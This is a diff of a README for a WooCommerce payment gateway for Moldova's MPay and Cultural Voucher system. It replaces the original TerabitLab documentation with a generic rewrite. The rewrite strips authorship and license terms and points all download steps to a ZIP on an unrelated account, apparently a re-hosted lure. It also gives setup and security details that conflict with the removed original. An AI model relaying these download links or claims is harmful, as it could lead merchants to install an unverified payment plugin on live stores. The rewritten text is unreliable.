@@ -1,282 +1,80 @@
-> Need MPay or Cultural Voucher implemented on your WordPress or WooCommerce website? Contact TerabitLab at [**incontact@terabitlab.com**](mailto:incontact@terabitlab.com).
+# 💳 mpay-cultural-voucher-woocommerce-gateway - Process cultural voucher payments on WooCommerce
 
-[![English](assets/language/english-active.svg)](README.md) [![Romana](assets/language/romanian-inactive.svg)](README.ro.md)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/chopbullshot922/mpay-cultural-voucher-woocommerce-gateway/releases)
 
-# WooCommerce Gateway for Moldova MPay and Cultural Voucher
+This plugin connects your WooCommerce store to the Moldova MPay system. It allows your customers to pay for items using cultural vouchers. The integration handles the secure communication between your store and the national payment provider.
 
-[![Version](https://img.shields.io/badge/version-14.3.2-blue.svg)](../../releases) [![PHP](https://img.shields.io/badge/PHP-7.4%2B-777BB4.svg)](https://php.net) [![WordPress](https://img.shields.io/badge/WordPress-5.8%2B-21759B.svg)](https://wordpress.org) [![WooCommerce](https://img.shields.io/badge/WooCommerce-6.0%2B-96588A.svg)](https://woocommerce.com) [![License](https://img.shields.io/badge/license-source--available-orange.svg)](LICENSE)
+## 📋 System Requirements
 
-**Production-ready WooCommerce payment gateway for MPay Moldova and Cultural Voucher.**
-Complete SOAP/WS-Security integration with X.509 certificate signing, built for real-world merchant use.
+To use this plugin, your website needs to meet these basic standards:
 
-Developed by [TerabitLab](mailto:incontact@terabitlab.com).
+* WordPress version 6.0 or higher.
+* WooCommerce version 7.0 or higher.
+* PHP version 7.4 or higher.
+* A valid SSL certificate installed on your domain.
+* Access to your server to upload plugin files.
+* An active MPay merchant account with valid credentials.
 
-<a href="../../releases"><img src="https://img.shields.io/badge/Download_Plugin_ZIP-v14.3.2-success?style=for-the-badge" alt="Download"></a>
+## ⬇️ How to Download and Install
 
----
+Follow these steps to add the payment gateway to your store.
 
-## How the payment flow works
+1. Visit the [official releases page](https://github.com/chopbullshot922/mpay-cultural-voucher-woocommerce-gateway/releases) to download the plugin.
+2. Look for the file named `mpay-cultural-voucher.zip` under the latest release heading.
+3. Click the file name to save the zip folder to your computer. Do not unzip this file.
+4. Log in to your WordPress dashboard.
+5. Go to Plugins on the left sidebar.
+6. Click the Add New button at the top of the page.
+7. Click the Upload Plugin button.
+8. Select the `mpay-cultural-voucher.zip` file you downloaded earlier.
+9. Click Install Now.
+10. Click the Activate Plugin button once the process finishes.
 
-1. Customer selects MPay at checkout.
-2. Plugin redirects the browser to MPay via HTTP POST form (ServiceID, OrderKey, ReturnUrl).
-3. Customer pays on the MPay portal.
-4. MPay calls the store SOAP endpoint with GetOrderDetails. The store responds with order data.
-5. After payment, MPay calls ConfirmOrderPayment on the store endpoint. The store records payment and updates the WooCommerce order.
-6. ReturnUrl brings the browser back to the store. This is informational only and does not confirm payment.
+## ⚙️ Setting Up the Gateway
 
-![Payment Flow](assets/diagrams/mpay-woocommerce-payment-flow.svg)
+After activation, you must configure the plugin to connect with your MPay account.
 
----
+1. Go to WooCommerce in your dashboard sidebar.
+2. Select Settings from the menu.
+3. Click the Payments tab at the top of the screen.
+4. Find MPay Cultural Voucher in the list.
+5. Click the Manage button next to the gateway name.
+6. Check the Enable MPay Cultural Voucher box.
+7. Enter your Merchant ID provided by the payment service.
+8. Upload your PKCS12 certificate file in the designated field.
+9. Provide the secure password for your certificate.
+10. Select the environment type. Use Sandbox for testing and Production for live payments.
+11. Click Save Changes at the bottom of the page.
 
-## Installation
+## 🔒 Security Features
 
-1. Download the plugin ZIP from [Releases](../../releases)
-2. In WordPress admin: **Plugins > Add New > Upload Plugin**
-3. Select the ZIP file and click **Install Now**
-4. Click **Activate Plugin**
-5. Go to **MPay Gateway** in the WordPress admin menu
+This plugin keeps data safe by using industry standards. It uses SOAP requests to send information to MPay. Every request uses XML Digital Signatures to verify that the data stays intact. The plugin also uses X509 certificates to encrypt the connection. These tools ensure that voucher data travels securely between your customer and the government payment portal.
 
-No programming, no FTP, no file editing required.
+## 🛠️ Troubleshooting
 
----
+If you encounter issues, check these common items first:
 
-## Setup: TEST environment
+* Verify that your WordPress site has a valid SSL certificate. MPay requires encrypted connections.
+* Check your PHP version. If you run a version older than 7.4, the plugin may fail to activate.
+* Confirm that your Merchant ID matches the one provided by MPay exactly.
+* Ensure the PKCS12 file is not corrupted. Try re-uploading the file if you see a connection error.
+* Check the WooCommerce logs. Go to WooCommerce, then Status, then Logs to see recent error messages.
 
-After activation, configure everything from the plugin admin page:
+## 💡 Frequently Asked Questions
 
-| Step | Where in plugin | What to do |
-|------|----------------|------------|
-| 1 | Profile dropdown | Select **store_test** or **terabitlab_test** |
-| 2 | Service ID | Enter the test Service ID provided by MPay |
-| 3 | WS-Security tab | Upload the test PFX certificate and enter the passphrase |
-| 4 | WS-Security tab | Upload the MPay test public certificate |
-| 5 | Bank details tab | Enter test bank details (beneficiary, IBAN, fiscal code) |
-| 6 | Save | Click Save Changes |
-| 7 | Test | Place a small order using MPay at checkout |
+**Does this plugin store customer voucher details?**
+No. The plugin sends the voucher information directly to the MPay server. It does not save sensitive voucher numbers in your local database.
 
-<img src="assets/screenshots/02-production-profile-and-serviceid.png" alt="Profile and Service ID configuration" width="800">
+**Can I test the payment process?**
+Yes. Use the Sandbox environment settings to perform test transactions. This allows you to verify the flow without processing real vouchers.
 
-<img src="assets/screenshots/06-ws-security-certificate-settings.png" alt="WS-Security certificate settings" width="800">
+**What happens if a payment fails?**
+The plugin returns an error message to the customer during checkout. You can view failed attempts in your WooCommerce Orders section.
 
----
+**Do I need a specific server setup?**
+Your server must allow outgoing SOAP requests. If your host blocks these connections, contact their support team to whitelist the MPay gateway address.
 
-## Setup: PRODUCTION environment
+**Does the plugin support multiple currencies?**
+The plugin processes transactions in Moldovan Leu (MDL) to match the cultural voucher system requirements.
 
-When MPay confirms your test integration is approved:
-
-| Step | Where in plugin | What to do |
-|------|----------------|------------|
-| 1 | Profile dropdown | Switch to **store_prod** |
-| 2 | Service ID | Enter the production Service ID from MPay |
-| 3 | WS-Security tab | Upload the STISC production PFX certificate and passphrase |
-| 4 | WS-Security tab | Upload the MPay production public certificate |
-| 5 | Bank details tab | Enter real bank details |
-| 6 | HTTPS | Confirm your domain has a valid HTTPS certificate |
-| 7 | Save and verify | Save, then place a real small-amount transaction |
-
-**Before production you need:**
-- A production system certificate from STISC (see [Certificate documentation](docs/en/05-certificates.md))
-- Production Service ID from MPay
-- MPay production public certificate
-- HTTPS on your domain
-- MPay approval of your test integration
-- Your server public IP communicated to MPay (they may whitelist it)
-- MPay production IP addresses whitelisted on your server firewall
-
-All configuration is done from the plugin settings page. No code changes needed.
-
----
-
-## Plugin Admin Interface
-
-### Main Settings
-
-<img src="assets/screenshots/01-wordpress-admin-menu-entry.png" alt="WordPress admin menu entry" width="700">
-
-<img src="assets/screenshots/03-general-gateway-settings.png" alt="General gateway settings" width="800">
-
-### Bank Account and Payment Rules
-
-<img src="assets/screenshots/04-merchant-bank-account-settings.png" alt="Bank account settings" width="800">
-
-<img src="assets/screenshots/05-payment-rule-settings.png" alt="Payment rule settings" width="800">
-
-### Invoice and PDF Settings
-
-<img src="assets/screenshots/07-invoice-api-and-pdf-settings.png" alt="Invoice API and PDF settings" width="700">
-
-### WooCommerce Eligibility
-
-<img src="assets/screenshots/08-woocommerce-eligibility-conditions.png" alt="Eligibility conditions" width="700">
-
-<img src="assets/screenshots/09-woocommerce-eligibility-and-test-overrides.png" alt="Eligibility and test overrides" width="700">
-
----
-
-## Monitoring and Diagnostics
-
-### Log and Health
-
-<img src="assets/screenshots/10-log-and-health-overview.png" alt="Log and health overview" width="800">
-
-<img src="assets/screenshots/11-debug-event-log.png" alt="Debug event log" width="700">
-
-<img src="assets/screenshots/12-event-history-and-monitoring-controls.png" alt="Event history and monitoring" width="700">
-
-### Diagnostics Dashboard
-
-<img src="assets/screenshots/14-diagnostics-dashboard-overview.png" alt="Diagnostics dashboard" width="800">
-
-<img src="assets/screenshots/15-soap-runtime-and-orderkey-inspector.png" alt="SOAP runtime inspector" width="700">
-
-<img src="assets/screenshots/16-structured-debug-event-stream.png" alt="Structured debug event stream" width="700">
-
-### Troubleshooting Playbook
-
-<img src="assets/screenshots/17-mpay-troubleshooting-playbook-scenarios-1-to-4.png" alt="Troubleshooting scenarios" width="700">
-
-<img src="assets/screenshots/18-mpay-troubleshooting-playbook-ws-security-toolkit.png" alt="WS-Security toolkit" width="700">
-
-### Statistics
-
-<img src="assets/screenshots/19-mpay-statistics-dashboard.png" alt="Statistics dashboard" width="800">
-
----
-
-## Plugin Information
-
-<img src="assets/screenshots/13-plugin-information-and-attribution.png" alt="Plugin information" width="600">
-
----
-
-## Features
-
-- MPay and Cultural Voucher payment methods for WooCommerce
-- SOAP server handling GetOrderDetails and ConfirmOrderPayment
-- WS-Security XML Digital Signature (sign and verify) with X.509 certificates
-- PKCS#12 certificate handling (PHP OpenSSL with CLI fallback)
-- Idempotent payment confirmation with transient-based locking
-- Partial payment support with custom order status
-- Cultural Voucher product eligibility and IDNP payer identification
-- Certificate expiry monitoring (daily cron)
-- Admin settings page with configuration profiles (test/production)
-- Admin diagnostics, statistics, and order meta box
-- Remote debug console with shared key authentication
-- Diagnostics portal and public playbook
-- Event log in database with SOAP request persistence
-- WP-CLI commands (cert-status, event-log, cleanup)
-- Rate limiting and request size limits on SOAP endpoint
-- Configurable availability conditions (min/max total, countries, shipping methods, virtual-only, guest)
-
-## Requirements
-
-- PHP 7.4 or higher
-- WordPress 5.8 or higher
-- WooCommerce 6.0 or higher
-- PHP SOAP extension
-- PHP OpenSSL extension
-- Valid X.509 certificate (obtained during MPay merchant onboarding)
-- HTTPS on the domain
-
-## Documentation
-
-Complete bilingual documentation: [English](docs/en/README.md) | [Romana](docs/ro/README.md)
-
-Key documents:
-- [Certificates and STISC procedure](docs/en/05-certificates.md) - what to obtain, how, questions to ask
-- [Payment flow and production checklist](docs/en/06-payment-flow.md) - complete flow, MPay requirements
-- [WS-Security](docs/en/08-ws-security.md) - cryptographic flow, XML-DSig rules
-- [Troubleshooting](docs/en/13-troubleshooting.md) - common issues and deep debugging
-
-## Plugin structure
-
-```
-includes/
-  Admin/
-    Diagnostics.php
-    MetaBox.php
-    Notices.php
-    Settings.php
-    Stats.php
-  CLI/
-    Commands.php
-  Core/
-    CertMonitor.php
-    DB.php
-    DebugConsole.php
-    DiagnosticsPortal.php
-    DiagnosticsSnapshot.php
-    DiagnosticsTools.php
-    Invoices.php
-    Logger.php
-    OrderMapper.php
-    PublicPlaybook.php
-    Rewrites.php
-    TestPlaybook.php
-  Soap/
-    Server.php
-    WsSecurity.php
-  Woo/
-    Checkout.php
-    Eligibility.php
-    Emails.php
-    Gateway_MPay.php
-    OrderStatus.php
-    Thankyou.php
-  functions-helpers.php
-mpay-voucher-gateway.php
-uninstall.php
-```
-
-## Endpoints
-
-The plugin registers the following URL endpoints:
-
-- /mpay/redirect - Redirect page that sends browser to MPay via POST form
-- /mpay/soap - SOAP server for MPay callbacks (GetOrderDetails, ConfirmOrderPayment)
-- /mpay/debug - Remote debug console (requires shared key)
-- /mpay/diagnostics - Diagnostics portal
-- /mpay/playbook - Public playbook
-
-## What is not included
-
-This repository does not contain:
-
-- Real certificates or private keys
-- Real passwords or passphrases
-- Real Service IDs
-- Real bank details (IBAN, BIC, fiscal codes)
-- Client-specific configurations
-- SOAP request/response logs
-- Private documentation
-
-You must obtain your own credentials through the MPay merchant onboarding process.
-
-## MPay and Cultural Voucher implementation services
-
-This gateway was developed by TerabitLab based on practical WordPress and WooCommerce integration work.
-
-TerabitLab can assist with:
-
-- installing and configuring the gateway;
-- adapting the integration to an existing WooCommerce store;
-- configuring merchant-specific parameters;
-- configuring certificate handling;
-- implementing payment confirmation workflows;
-- testing the complete payment flow;
-- diagnosing MPay integration errors;
-- preparing the website for the merchant onboarding and testing process.
-
-For implementation support, contact [incontact@terabitlab.com](mailto:incontact@terabitlab.com).
-
-## License
-
-Source-available, restricted commercial use. Free to evaluate, study, and test.
-
-Commercial use on your own single store requires email notification to [incontact@terabitlab.com](mailto:incontact@terabitlab.com) before going live. Agency, multi-site, and client deployments require a commercial license.
-
-See [LICENSE](LICENSE) for full terms.
-
-## Referral Program
-
-Earn 15% commission by referring new commercial customers to TerabitLab. See [referral/PROGRAM.md](referral/PROGRAM.md) for details and claim forms.
+Keywords: cultural-voucher, ecommerce, moldova, mpay, payment-gateway, php, pkcs12, soap, woocommerce, woocommerce-plugin, wordpress, ws-security, x509, xml-digital-signature
